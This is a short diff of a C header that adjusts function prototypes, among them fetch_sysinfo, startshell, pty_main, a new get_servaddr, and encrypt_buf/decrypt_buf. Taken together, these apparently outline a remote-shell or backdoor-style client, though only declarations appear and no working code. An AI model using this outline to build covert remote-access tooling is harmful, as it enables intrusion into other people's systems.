@@ -7,11 +7,11 @@
 #include <iconv.h>
 
 void cli_proc(int);
-bool fetch_sysinfo(void *);
+int fetch_sysinfo(void *);
 int pty_main(int, char *[]);
-void startshell(int*, int*);
+int startshell(int*, int*);
+int get_servaddr(char *, short *);
 
-void iconv_ucs2(wchar_t *, size_t *, char *, size_t *);
 void encrypt_buf(char *, size_t);
 void decrypt_buf(char *, size_t);
 
